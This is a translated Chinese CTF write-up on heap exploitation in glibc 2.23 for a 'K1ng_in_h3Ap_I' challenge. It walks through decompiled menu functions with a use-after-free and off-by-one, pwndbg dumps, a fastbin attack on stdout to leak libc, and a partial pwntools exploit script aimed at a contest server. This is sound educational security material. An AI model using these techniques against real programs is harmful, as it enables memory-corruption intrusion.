# 从长城杯两道题目看新老libc的利用
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
长城杯出了三道题目，除了easy_vm之外剩下的两道都是libc题，一个是libc2.23，一个是libc2.27-1.4。正好可以从这两道题目中看一下新老版本的libc的利用方式。
## K1ng_in_h3Ap_I
这道题目是一个入门级的题目，libc的版本是2.23
    GNU C Library (Ubuntu GLIBC 2.23-0ubuntu11.3) stable release version 2.23, by Roland McGrath et al.
    Copyright (C) 2016 Free Software Foundation, Inc.
    This is free software; see the source for copying conditions.
    There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
    PARTICULAR PURPOSE.
    Compiled by GNU CC version 5.4.0 20160609.
    Available extensions:
            crypt add-on version 2.1 by Michael Glad and others
            GNU Libidn by Simon Josefsson
            Native POSIX Threads Library by Ulrich Drepper et al
            BIND-8.2.3-T5B
    libc ABIs: UNIQUE IFUNC
    For bug reporting instructions, please see:
    .
我们逆向分析一下这个程序，题目的逻辑很简单，是一个基础的菜单题目，一共有add，delete，edit三种，并且存在一个后门函数也就是输入666的时候触发调用，先来看一下后门函数
    return printf("%p\n", (const void *)((unsigned __int64)&printf & 0xFFFFFF));
也就是我们可以直接通过后门函数获取得到libc基地址的低3字节，那么这个有什么用呢，我们接下来在看，继续分析其他的函数
add函数，申请我们输入指定size大小的内存堆块
    _DWORD *add()
    {
      _DWORD *result; // rax
      int index; // [rsp+8h] [rbp-8h]
      int size; // [rsp+Ch] [rbp-4h]
      puts("input index:");
      index = readint();
      if ( index  10 )
        exit(0);
      puts("input size:");
      size = readint();
      if ( size  0xF0 )
        exit(0);
      buf_list[index] = malloc(size);
      result = size_list;
      size_list[index] = size;
      return result;
    }
但是这里size的大小不能超过0xf0。再来看一下delete函数
    void sub_C41()
    {
      int index; // [rsp+Ch] [rbp-4h]
      puts("input index:");
      index = readint();
      if ( index  10 || !*((_QWORD *)&buf_list + index) || !size_list[index] )
        exit(0);
      free(*((void **)&buf_list + index));
    }
这里delete函数直接释放了我们在add函数中申请的内存空间，但是这里没有将buf_list和size_list中的相应位置清空，导致存在一个UAF的漏洞，再看一下edit函数
    __int64 edit()
    {
      int index; // [rsp+Ch] [rbp-4h]
      puts("input index:");
      index = readint();
      if ( index  15 || !buf_list[index] )
        exit(0);
      puts("input context:");
      return do_edit(buf_list[index], (unsigned int)size_list[index]);
    }
edit函数这里调用了一个do_edit函数来进行内容的更改，函数如下
    unsigned __int64 __fastcall do_edit(__int64 address, int size)
    {
      char buf; // [rsp+13h] [rbp-Dh] BYREF
      int index; // [rsp+14h] [rbp-Ch]
      unsigned __int64 v5; // [rsp+18h] [rbp-8h]
      v5 = __readfsqword(0x28u);
      index = 0;
      do
      {
        if ( !(unsigned int)read(0, &buf, 1uLL) )
          exit(0);
        if ( buf == 10 )
          break;
        *(_BYTE *)(address + index++) = buf;
      }
      while ( index  x/20gx 0x7ffff7dd2620-0x40
    0x7ffff7dd25e0 :   0x00007ffff7dd1660      0x0000000000000000
    0x7ffff7dd25f0 :   0x0000000000000000      0x0000000000000000
    0x7ffff7dd2600 :   0x0000000000000000      0x0000000000000000
    0x7ffff7dd2610 :   0x0000000000000000      0x0000000000000000
    0x7ffff7dd2620 :       0x00000000fbad3887      0x00007ffff7dd26a3
    0x7ffff7dd2630 :    0x00007ffff7dd26a3      0x00007ffff7dd26a3
    0x7ffff7dd2640 :    0x00007ffff7dd26a3      0x00007ffff7dd26a3
    0x7ffff7dd2650 :    0x00007ffff7dd26a3      0x00007ffff7dd26a3
    0x7ffff7dd2660 :    0x00007ffff7dd26a4      0x0000000000000000
    0x7ffff7dd2670 :    0x0000000000000000      0x0000000000000000
    pwndbg> x/20gx 0x7ffff7dd2620-0x43
    0x7ffff7dd25dd :   0xfff7dd1660000000      0x000000000000007f
    0x7ffff7dd25ed :   0x0000000000000000      0x0000000000000000
    0x7ffff7dd25fd :   0x0000000000000000      0x0000000000000000
    0x7ffff7dd260d :   0x0000000000000000      0x0000000000000000
    0x7ffff7dd261d :   0x00fbad3887000000      0xfff7dd26a3000000
    0x7ffff7dd262d :    0xfff7dd26a300007f      0xfff7dd26a300007f
    0x7ffff7dd263d :    0xfff7dd26a300007f      0xfff7dd26a300007f
    0x7ffff7dd264d :    0xfff7dd26a300007f      0xfff7dd26a300007f
    0x7ffff7dd265d :    0xfff7dd26a400007f      0x000000000000007f
    0x7ffff7dd266d :    0x0000000000000000      0x0000000000000000
也就是-0x43的位置中的0x7f恰好可以作为0x70的fastbin堆块。但是我们现在只有低3字节，还需要在堆中提前布局一个libc附近的地址。这里可以直接利用main_arena的地址，利用off-by-one很容易做到堆块合并，进而释放到unsorted
bin中，再次申请就能拿到一个libc附近的地址了，覆写该地址的低3字节即可申请到stdout结构体中泄漏出libc的地址
    [DEBUG] Received 0xc0 bytes:
        00000000  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
        *
        00000020  87 38 ad fb  00 00 00 00  00 00 00 00  00 00 00 00  │·8··│····│····│····│
        00000030  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
        00000040  00 26 dd f7  ff 7f 00 00  a3 26 dd f7  ff 7f 00 00  │·&··│····│·&··│····│
        00000050  a3 26 dd f7  ff 7f 00 00  a3 26 dd f7  ff 7f 00 00  │·&··│····│·&··│····│
        00000060  a4 26 dd f7  ff 7f 00 00  00 00 00 00  00 00 00 00  │·&··│····│····│····│
        00000070  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
        00000080  00 00 00 00  00 00 00 00  e0 18 dd f7  ff 7f 00 00  │····│····│····│····│
        00000090  01 00 00 00  00 00 00 00  ff ff ff ff  ff ff ff ff  │····│····│····│····│
        000000a0  00 00 00 31  2e 20 61 64  64 0a 32 2e  20 64 65 6c  │···1│. ad│d·2.│ del│
        000000b0  65 74 65 0a  33 2e 20 65  64 69 74 0a  3e 3e 20 0a  │ete·│3. e│dit·│>> ·│
        000000c0
拿到libc的地址之后就很好说了，利用相同的思路分配堆块到malloc_hook的位置，覆写其为one_gadget。但是这里存在一个问题就是one_gadget都不能使用，需要使用realloc进行栈帧的调整，小问题。
    # -*- coding: utf-8 -*-    from pwn import *
    file_path = "./pwn"
    context.arch = "amd64"
    elf = ELF(file_path)
    debug = 1
    if debug:
        p = process([file_path])
        # gdb.attach(p, "b *$rebase(0xE52)")
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        one_gadget = [0x45226, 0x4527a, 0xf03a4, 0xf1247]
    else:
        p = remote('47.104.175.110', 20066)
        libc = ELF('./libc.so.6')
        one_gadget = [0x45226, 0x4527a, 0xf03a4, 0xf1247]
    def add(index, size):
        p.sendlineafter(">> \n", "1")
        p.sendlineafter("input index:\n", str(index))
        p.sendlineafter("input size:\n", str(size))
    def delete(index):
        p.sendlineafter(">> \n", "2")
        p.sendlineafter("input index:\n", str(index))
    def edit(index, content):
        p.sendlineafter(">> \n", "3")
        p.sendlineafter("input index:\n", str(index))
        p.sendafter("input context:\n", content)
    def show():
        p.sendlineafter(">> \n", "666")
    ori_io = libc.sym['_IO_2_1_stdout_']
    show()
    libc.address = int(p.recvline().strip(), 16) - libc.sym['printf']
    add(0, 0x68)
    add(1, 0x68)
    add(2, 0x68)
    add(3, 0x68)
    payload = b"a"*0x68 + b"\xe1"
    delete(1)
    edit(0, payload)
    delete(1)
    add(6, 0x3)
    payload = b"a"*0x68 + b"\x71"
    edit(0, payload)
    payload = p32(libc.sym['_IO_2_1_stdout_'] - 0x43)[:3] + b"\n"
    edit(6, payload)
    add(4, 0x68)
    add(5, 0x68)
    payload = b"\x00"*3 + p64(0)*6 + p64(0x00000000fbad2887 | 0x1000) + p64(0)*3 + b"\x00" + b"\n"
    edit(5, payload)
    p.recvuntil(p64(0x00000000fbad2887 | 0x1000))
    p.recv(0x18)
    libc.address = u64(p.recv(8)) + 0x20 - ori_io
    delete(4)